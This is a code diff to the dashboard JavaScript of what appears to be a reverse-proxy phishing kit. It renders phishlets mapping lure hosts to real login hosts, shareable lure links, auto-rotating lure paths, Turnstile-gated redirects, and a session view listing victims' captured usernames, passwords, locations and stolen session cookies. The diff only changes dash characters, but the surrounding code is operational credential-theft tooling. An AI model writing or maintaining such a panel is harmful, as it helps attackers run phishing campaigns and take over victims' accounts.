@@ -84,9 +84,9 @@ async function mgPhishlets() {
       (p.enabled ? '<span class="badge ok">enabled</span>' : '<span class="badge mut">disabled</span>') +
       (p.hidden ? ' <span class="badge warn">hidden</span>' : '') + '</h3></div>' +
       '<div style="padding:14px 16px"><div class="kv">' +
-        '<span class="k">Hostname</span><span class="v">' + esc(p.hostname || '—') + '</span>' +
-        '<span class="k">Landing</span><span class="v">' + esc(p.landing_host || '—') + '</span>' +
-        '<span class="k">Real login</span><span class="v">' + esc(p.login_host || '—') + '</span>' +
+        '<span class="k">Hostname</span><span class="v">' + esc(p.hostname || '-') + '</span>' +
+        '<span class="k">Landing</span><span class="v">' + esc(p.landing_host || '-') + '</span>' +
+        '<span class="k">Real login</span><span class="v">' + esc(p.login_host || '-') + '</span>' +
         '<span class="k">unauth_url</span><span class="v">' + esc(p.unauth_url || '(global)') + '</span>' +
       '</div><div class="actions mt14">' +
         (p.enabled
@@ -113,7 +113,7 @@ async function mgLures() {
   d.lures.forEach(function (l) {
     h += '<tr><td class="mono dim">#' + l.id + '</td><td><span class="badge acc">' + esc(l.phishlet) + '</span></td>' +
       '<td class="mono"><span class="copy" data-act="copy" data-copy="' + esc(l.link) + '">' + esc(l.link) + ' ⧉</span></td>' +
-      '<td class="dim">' + esc(l.info || '—') + '</td>' +
+      '<td class="dim">' + esc(l.info || '-') + '</td>' +
       '<td>' + (l.paused ? '<span class="badge warn">paused</span>' : (l.active ? '<span class="badge ok">active</span>' : '<span class="badge mut">scheduled</span>')) +
       (l.auto_rotate ? ' <span class="badge mut">auto</span>' : '') + '</td>' +
       '<td class="right actions">' +
@@ -131,7 +131,7 @@ async function mgLures() {
 async function mgAutolures() {
   var d = await API.get(ep('autolures'));
   var h = '<div class="actions mb14"><button class="btn sm primary" data-act="mg-auto-new">New autolure</button></div>';
-  if (!d.autolures.length) return h + '<div class="empty"><div class="big">↻</div>No autolures. Share the gateway URL only — the path rotates.</div>';
+  if (!d.autolures.length) return h + '<div class="empty"><div class="big">↻</div>No autolures. Share the gateway URL only - the path rotates.</div>';
   h += '<div class="card pad0"><table><thead><tr><th>ID</th><th>Phishlet</th><th>Gateway (share)</th><th>Active path</th><th>Next</th><th>Notify</th><th></th></tr></thead><tbody>';
   d.autolures.forEach(function (l) {
     var secs = l.next_rotate - d.now;
@@ -153,7 +153,7 @@ async function mgRedirects() {
   try { tpls = await API.get(ep('redirect-templates')); } catch (e) {}
   var rows = list.redirects.map(function (r) {
     return '<tr><td class="mono dim">#' + r.id + '</td><td class="mono">' + esc(r.host) + '</td>' +
-      '<td class="mono">' + esc(r.file) + '</td><td class="mono trunc">' + esc(r.target_url || '—') + '</td>' +
+      '<td class="mono">' + esc(r.file) + '</td><td class="mono trunc">' + esc(r.target_url || '-') + '</td>' +
       '<td>' + (r.turnstile ? '<span class="badge warn">' + esc(r.turnstile_type || 'on') + '</span>' : '<span class="badge mut">off</span>') + '</td>' +
       '<td class="right actions"><button class="btn xs sm" data-act="mg-redir-edit" data-id="' + r.id + '">Edit</button>' +
       '<button class="btn xs sm" data-act="mg-redir-preview" data-id="' + esc(r.host) + '">Open</button>' +
@@ -227,9 +227,9 @@ async function mgLogs() {
   var sys = {};
   try { sys = await API.get(ep('system')); } catch (e) {}
   var info = '<div class="kv mb14">' +
-    '<span class="k">Service</span><span class="v">' + esc(sys.blacklist_mode ? 'ok' : '—') + '</span>' +
-    '<span class="k">Domain</span><span class="v">' + esc(sys.domain || '—') + '</span>' +
-    '<span class="k">Version</span><span class="v">' + esc(sys.version || '—') + '</span>' +
+    '<span class="k">Service</span><span class="v">' + esc(sys.blacklist_mode ? 'ok' : '-') + '</span>' +
+    '<span class="k">Domain</span><span class="v">' + esc(sys.domain || '-') + '</span>' +
+    '<span class="k">Version</span><span class="v">' + esc(sys.version || '-') + '</span>' +
     '<span class="k">Cert</span><span class="v">' + esc(sys.cert && sys.cert.loaded ? (sys.cert.subject + ' · ' + sys.cert.days_left + ' days') : 'none') + '</span>' +
     '<span class="k">Blacklist</span><span class="v">' + esc((sys.blacklist_ips || 0) + ' ips · mode ' + (sys.blacklist_mode || '')) + '</span>' +
   '</div>';
@@ -288,10 +288,10 @@ Object.assign(ACTIONS, {
   'mg-sess': function (id) {
     run(async function () {
       var s = await API.get(ep('sessions/' + id));
-      var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '')) : '—';
+      var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '')) : '-';
       openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet),
-        '<div class="kv"><span class="k">Username</span><span class="v">' + esc(s.username || '—') + '</span>' +
-        '<span class="k">Password</span><span class="v">' + esc(s.password || '—') + '</span>' +
+        '<div class="kv"><span class="k">Username</span><span class="v">' + esc(s.username || '-') + '</span>' +
+        '<span class="k">Password</span><span class="v">' + esc(s.password || '-') + '</span>' +
         '<span class="k">IP</span><span class="v">' + esc(s.remote_addr) + '</span>' +
         '<span class="k">Location</span><span class="v">' + esc(geo) + '</span>' +
         '<span class="k">Tokens</span><span class="v">' + (s.has_tokens ? s.token_count + ' cookies' : 'none') + '</span></div>' +
